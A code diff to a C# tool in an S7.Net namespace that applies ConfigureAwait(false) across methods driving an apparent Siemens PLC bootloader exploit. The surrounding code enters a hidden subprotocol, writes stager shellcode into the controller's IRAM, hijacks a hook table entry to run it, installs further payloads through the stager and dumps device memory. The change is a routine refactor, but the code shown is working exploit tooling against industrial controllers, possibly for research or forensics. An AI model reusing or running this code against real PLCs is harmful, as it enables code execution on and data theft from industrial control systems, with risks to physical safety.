@@ -150,7 +150,7 @@ namespace S7.Net
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Getting bootloader version...");
-            var response = await InvokePrimaryHandler(0, Array.Empty<byte>(), true, cancellationToken);
+            var response = await InvokePrimaryHandler(0, Array.Empty<byte>(), true, cancellationToken).ConfigureAwait(false);
             if (response is null) throw new Exception("Failed to get version.");
             _log($"[VERSION RAW HEX] {BitConverter.ToString(response)}");
             _log($"[VERSION RAW ASCII] {Encoding.ASCII.GetString(response)}");
@@ -182,7 +182,7 @@ namespace S7.Net
             ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
             byte[] payload = BitConverter.GetBytes(magic);
             if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
-            var response = await InvokePrimaryHandler(0x80, payload, true, cancellationToken);
+            var response = await InvokePrimaryHandler(0x80, payload, true, cancellationToken).ConfigureAwait(false);
             if (response == null || !response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                 throw new Exception("Failed to enter subprotocol.");
             _log("Entered subprotocol successfully.");
@@ -195,10 +195,10 @@ namespace S7.Net
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Leaving subprotocol...");
-            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 }, cancellationToken: cancellationToken);
+            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 }, cancellationToken: cancellationToken).ConfigureAwait(false);
             try
             {
-                await _protocol.ReceivePacketAsync(cancellationToken);
+                await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
             }
             catch (ChecksumMismatchException ex)
             {
@@ -223,10 +223,10 @@ namespace S7.Net
             Array.Copy(addrBytes, 0, payload, 3, 4);
             Array.Copy(data, 0, payload, 7, data.Length);
 
-            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
+            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken).ConfigureAwait(false);
             try
             {
-                await _protocol.ReceivePacketAsync(cancellationToken);
+                await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
             }
             catch (ChecksumMismatchException ex)
             {
@@ -244,9 +244,9 @@ namespace S7.Net
         {
             uint targetArgument = targetAddress - 0x10000000;
             // 1. Mask with 0xFF bytes
-            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray(), cancellationToken);
+            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray(), cancellationToken).ConfigureAwait(false);
             // 2. Write actual contents
-            await RawSubprotocolWrite(targetArgument, contents, cancellationToken);
+            await RawSubprotocolWrite(targetArgument, contents, cancellationToken).ConfigureAwait(false);
         }
 
         /// <summary>
@@ -259,7 +259,7 @@ namespace S7.Net
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
-            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM, cancellationToken);
+            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM, cancellationToken).ConfigureAwait(false);
 
             int chunkSize = 16; // From python script
             for (int i = 0; i < contents.Length; i += chunkSize)
@@ -269,10 +269,10 @@ namespace S7.Net
                 var chunk = new byte[size];
                 Array.Copy(contents, i, chunk, 0, size);
                 _log($"Writing chunk {i / chunkSize + 1}...");
-                await WriteChunkToIram(targetAddress + (uint)i, chunk, cancellationToken);
+                await WriteChunkToIram(targetAddress + (uint)i, chunk, cancellationToken).ConfigureAwait(false);
             }
 
-            await LeaveSubprotocol(cancellationToken);
+            await LeaveSubprotocol(cancellationToken).ConfigureAwait(false);
             _log("Finished writing to IRAM.");
         }
 
@@ -286,7 +286,7 @@ namespace S7.Net
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Starting stager installation...");
             // 1. Write stager shellcode to its location in IRAM
-            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken);
+            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken).ConfigureAwait(false);
 
             // 2. Overwrite an entry in the hook table to point to our stager
             _log("Overwriting hook table entry...");
@@ -298,7 +298,7 @@ namespace S7.Net
             var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
             Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);
 
-            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
+            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload).ConfigureAwait(false);
 
             _log("Stager installation complete.");
             _log($"[PROTOCOL] ✅ Stager installed at hook index 0x{PlcConstants.DEFAULT_STAGER_ADDHOOK_IND:X2}");
@@ -351,7 +351,7 @@ namespace S7.Net
             {
                 cancellationToken.ThrowIfCancellationRequested();
                 // Add safety delay between chunks (matches Python SEND_REQ_SAFETY_SLEEP_AMT)
-                await Task.Delay(10, cancellationToken);
+                await Task.Delay(10, cancellationToken).ConfigureAwait(false);
 
                 int size = Math.Min(maxChunkSize, msg.Length - i);
                 var chunk = new byte[size];
@@ -360,13 +360,13 @@ namespace S7.Net
                 _log($"[BYTES] Send progress: 0x{i:X6}/0x{msg.Length:X6} ({(float)i / msg.Length:P2})");
                 var encoded = EncodePacketForStager(chunk);
                 _log($"[BYTES] Encoded chunk (with XOR key): {BitConverter.ToString(encoded)}");
-                await _protocol.SendPacketAsync(encoded, 8, 10, cancellationToken);
+                await _protocol.SendPacketAsync(encoded, 8, 10, cancellationToken).ConfigureAwait(false);
                 _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");
 
                 byte[]? ack = null;
                 try
                 {
-                    ack = await _protocol.ReceivePacketAsync(cancellationToken);
+                    ack = await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
                 }
                 catch (ChecksumMismatchException ex)
                 {
@@ -390,11 +390,11 @@ namespace S7.Net
             // Send empty packet to signify end of transmission
             var endPacket = EncodePacketForStager(Array.Empty<byte>());
             _log($"[BYTES] Sending end packet: {BitConverter.ToString(endPacket)}");
-            await _protocol.SendPacketAsync(endPacket, cancellationToken: cancellationToken);
+            await _protocol.SendPacketAsync(endPacket, cancellationToken: cancellationToken).ConfigureAwait(false);
             byte[]? finalAck = null;
             try
             {
-                finalAck = await _protocol.ReceivePacketAsync(cancellationToken);
+                finalAck = await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
             }
             catch (ChecksumMismatchException ex)
             {
@@ -421,7 +421,7 @@ namespace S7.Net
             payload[0] = (byte)hookNo;
             Array.Copy(args, 0, payload, 1, args.Length);
 
-            return await InvokePrimaryHandler(0x1c, payload, awaitResponse, cancellationToken);
+            return await InvokePrimaryHandler(0x1c, payload, awaitResponse, cancellationToken).ConfigureAwait(false);
         }
 
         /// <summary>
@@ -434,8 +434,8 @@ namespace S7.Net
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             var addressBytes = GetBigEndianBytes(address);
-            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false, cancellationToken);
-            await SendFullMsgViaStager(contents, cancellationToken);
+            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false, cancellationToken).ConfigureAwait(false);
+            await SendFullMsgViaStager(contents, cancellationToken).ConfigureAwait(false);
         }
 
         /// <summary>
@@ -455,10 +455,10 @@ namespace S7.Net
             hookEntry[5] = (byte)(targetAddress >> 16);
             hookEntry[6] = (byte)(targetAddress >> 8);
             hookEntry[7] = (byte)targetAddress;
-            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken);
+            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken).ConfigureAwait(false);
 
             // Write the code of the handler itself
-            await WriteViaStager(targetAddress, payload, cancellationToken);
+            await WriteViaStager(targetAddress, payload, cancellationToken).ConfigureAwait(false);
         }
 
         /// <summary>
@@ -478,7 +478,7 @@ namespace S7.Net
                     byte[]? chunk = null;
                     try
                     {
-                        chunk = await _protocol.ReceivePacketAsync(cancellationToken);
+                        chunk = await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
                     }
                     catch (ChecksumMismatchException ex)
                     {
@@ -491,7 +491,7 @@ namespace S7.Net
                     {
                         break;
                     }
-                    await ms.WriteAsync(chunk, 0, chunk.Length, cancellationToken);
+                    await ms.WriteAsync(chunk, 0, chunk.Length, cancellationToken).ConfigureAwait(false);
                     progress?.Report(ms.Length);
                 }
                 return ms.ToArray();
@@ -524,7 +524,7 @@ namespace S7.Net
             cancellationToken.ThrowIfCancellationRequested();
 
             _log("Installing memory dumper payload...");
-            await InstallAddHookViaStager(_nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, cancellationToken);
+            await InstallAddHookViaStager(_nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, cancellationToken).ConfigureAwait(false);
             _nextPayloadLocation += (uint)dumpMemPayload.Length;
             // Align to next 4-byte boundary
             if (_nextPayloadLocation % 4 != 0)
@@ -544,7 +544,7 @@ namespace S7.Net
             Array.Copy(addrBytes, 0, args, 1, 4);
             Array.Copy(lenBytes, 0, args, 5, 4);
 
-            var response = await InvokeAddHook(PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, args, true, cancellationToken);
+            var response = await InvokeAddHook(PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, args, true, cancellationToken).ConfigureAwait(false);
 
             if (response == null || !Encoding.ASCII.GetString(response).TrimEnd('\0').StartsWith("Ok"))
             {
@@ -555,7 +555,7 @@ namespace S7.Net
             cancellationToken.ThrowIfCancellationRequested();
 
             _log("Memory dump started. Receiving data...");
-            var data = await ReceiveMany(progress, cancellationToken);
+            var data = await ReceiveMany(progress, cancellationToken).ConfigureAwait(false);
             _log($"Memory dump complete. Received {data.Length} bytes.");
             return data;
         }
